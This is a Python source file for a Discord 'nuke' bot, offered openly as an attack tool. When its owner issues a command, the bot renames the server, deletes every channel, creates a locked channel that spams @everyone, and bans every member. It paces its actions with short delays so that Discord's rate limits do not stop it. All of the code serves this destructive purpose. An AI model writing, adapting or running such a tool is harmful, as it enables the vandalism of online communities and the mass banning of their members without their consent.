import discord
from discord.ext import commands
import asyncio
import random

TOKEN = "UR_TOKEN_BOT_BITCH"
OWNER_ID = 000000000000000000
GUILD_ID = 000000000000000000
NEW_GUILD_NAME = "nuked"
AVATAR_PATH = "avatar.png"
MSG_PATH = "msg.txt"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, owner_id=OWNER_ID)

@bot.event
async def on_ready():
    print(f"online as {bot.user}")

@bot.command()
async def nuke(ctx):
    if ctx.author.id != OWNER_ID:
        return

    guild = ctx.guild
    owner = ctx.author

    with open(MSG_PATH, "r", encoding="utf-8") as f:
        msg = f.read().strip()

    with open(AVATAR_PATH, "rb") as f:
        avatar_bytes = f.read()

    try:
        await guild.edit(name=NEW_GUILD_NAME, icon=avatar_bytes)
    except Exception:
        pass

    for channel in list(guild.channels):
        try:
            await channel.delete()
            await asyncio.sleep(0.4)
        except Exception:
            pass

    tag = f"{owner.name}-{random.randint(1000, 9999)}"
    channel_name = f"nuked-by-{tag}"

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(
            send_messages=False,
            view_channel=True,
            read_message_history=True
        ),
        guild.me: discord.PermissionOverwrite(
            send_messages=True,
            mention_everyone=True
        )
    }

    spam = await guild.create_text_channel(channel_name, overwrites=overwrites)

    async def spam_loop():
        for _ in range(30):
            try:
                await spam.send(f"@everyone {msg}")
                await asyncio.sleep(1.2)
            except Exception:
                pass

    async def ban_loop():
        async for member in guild.fetch_members(limit=None):
            if member.id in (bot.user.id, OWNER_ID):
                continue
            try:
                await guild.ban(member, delete_message_days=0)
                await asyncio.sleep(0.3)
            except Exception:
                pass

    await asyncio.gather(spam_loop(), ban_loop())

bot.run(TOKEN)